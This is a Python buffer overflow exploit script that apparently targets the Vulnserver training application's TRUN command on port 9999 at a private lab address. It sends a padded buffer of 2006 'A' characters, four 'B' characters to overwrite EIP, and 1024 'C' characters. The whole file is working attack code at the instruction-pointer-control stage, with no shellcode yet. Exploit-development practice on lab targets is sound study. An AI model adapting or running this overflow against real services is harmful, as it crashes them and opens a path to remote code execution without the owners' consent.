# -*-coding:Latin-1 -*
import socket
import time
import sys

# ----- INPUT -----
target = '192.168.56.104'
port = 9999
offset = 2006
extra_length = 1024 # Increase the number of 'C' chars after overwriting EIP register
# -----------------

TIMEOUT = 2

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    s.connect((target, port))

    print('Sending evil data...')
    # ----- EXPLOIT -----
    s.recv(1024)
    buffer = 'A' * offset + 'B' * 4 + 'C' * extra_length
    cmd = 'TRUN .' + buffer
    s.send(cmd.encode())
    # -------------------
    print('Done!')
    s.close()

except socket.timeout:
    print('Remote host seems down!')
except Exception as e:
    print("Exception: %s" % str(e))
    sys.exit(1)
